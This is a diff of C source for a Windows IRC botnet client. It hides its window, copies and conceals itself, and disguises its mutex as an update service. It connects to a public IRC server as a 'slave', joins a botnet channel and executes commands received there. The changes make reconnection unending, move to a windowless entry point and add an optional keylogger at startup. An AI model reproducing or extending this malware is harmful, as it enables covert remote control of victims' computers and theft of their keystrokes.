@@ -5,7 +5,6 @@
 HANDLE hMutex;
 
 BOOL is_already_running() {
-    // 使用 Mutex 防止重复运行
     hMutex = CreateMutexW(NULL, FALSE, L"Global\\UpdateServiceMutex");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         bot_log("[!] Another instance is already running.\n");
@@ -15,24 +14,17 @@ BOOL is_already_running() {
 }
 
 
-const char* version = "bot 3.0";
+
+
+const char* version = "bot 1.0";
 MessageBuffer msgBuffer;
 SOCKET ircsock;
  
-int main(int argc, char* argv[]) {
-
-    if (!DEBUG) {
-        HWND hwnd = GetConsoleWindow();  
-        if (hwnd) {
-            ShowWindow(hwnd, SW_HIDE);   // 隐藏窗口
-        }
-    }
-
+int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
+{
 
     init_log_path();
     bot_log("version :%s",version);
-
-
 
 
     if (!is_hidden_bot() && HIDE_ON_ENTRY) {
@@ -40,9 +32,6 @@ int main(int argc, char* argv[]) {
         copy_and_hide_bot();
         WSACleanup();
         return 0;
-    }
-    else {
-        bot_log("Is hidden process, starting to run...\n");
     }
 
     if (is_already_running())
@@ -52,7 +41,7 @@ int main(int argc, char* argv[]) {
     const char* channel = "#mybotnet123123";
     int reconnectAttempts = 0;
 
-    while (reconnectAttempts <= MAX_RECONNECT_ATTEMPTS) {
+    while (1) {
         ircsock = TCPhandler("irc.libera.chat", "slave");
         if (ircsock == INVALID_SOCKET) {
             bot_log("Failed to connect to IRC server. Attempt %d of %d...\n",
@@ -62,24 +51,14 @@ int main(int argc, char* argv[]) {
             continue;
         }
 
-        // 自动加入频道
-        
-        char joinCmd[128];
-        snprintf(joinCmd, sizeof(joinCmd), "JOIN %s\r\n", channel);
-        send(ircsock, joinCmd, (int)strlen(joinCmd), 0);
-        bot_log("[+] Joined channel: %s\n", channel);
+        if (join_channel(channel) != 0)
+            continue;
 
+#ifdef KEYLOG_ON_ENTRY
+        start_keylog();
+#endif
 
         char buf[DEFAULT_BUFLEN];
-
-
-        //snprintf(buf, sizeof(buf), "PRIVMSG %s :Bot is online!\r\n", owner);
-        //appendToBuffer(&msgBuffer, ircsock, buf);
-        //snprintf(buf, sizeof(buf), "AppData PATH : %s", appdata_path);
-        //appendToBuffer(&msgBuffer, ircsock, buf);
-        //snprintf(buf, sizeof(buf), "CodePage : %u", GetACP());
-        //appendToBuffer(&msgBuffer, ircsock, buf);
-        //flushBuffer(&msgBuffer, ircsock);
 
         while (1) {
             int n = recv(ircsock, buf, sizeof(buf) - 1, 0);
@@ -90,9 +69,6 @@ int main(int argc, char* argv[]) {
             }
 
             buf[n] = '\0';  // Null-terminate
-
-
-
 
             // 处理 PING/PONG
             if (strncmp(buf, "PING", 4) == 0) {
@@ -111,8 +87,7 @@ int main(int argc, char* argv[]) {
                 if (colon != NULL) {
                     char* command = colon + 1;
 
-                    // 新增：UTF-8转ANSI转换
-                    char ansiCommand[DEFAULT_BUFLEN]; // 确保足够大的缓冲区
+                    char ansiCommand[DEFAULT_BUFLEN]; 
                     int res = Utf8ToAnsi(command, ansiCommand, sizeof(ansiCommand));
                     if (res < 0) {
                         bot_log("Error converting UTF-8 to ANSI: %d\n", res);
@@ -161,11 +136,7 @@ int main(int argc, char* argv[]) {
             memset(buf, 0, sizeof(buf));
         }
 
-        reconnectAttempts++;
-        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
-            bot_log("Reconnecting in %d seconds...\n", RECONNECT_INTERVAL / 1000);
-            Sleep(RECONNECT_INTERVAL);
-        }
+        Sleep(RECONNECT_INTERVAL);
     }
 
     WSACleanup();
